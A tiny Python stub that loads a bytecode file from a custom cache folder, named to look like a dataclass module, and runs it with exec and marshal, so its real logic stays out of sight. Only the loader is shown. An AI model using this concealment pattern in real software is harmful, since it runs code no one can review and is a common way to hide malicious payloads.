
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'dataclass_b6e35fccc63b480cbeecc4e4cb9498e7.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
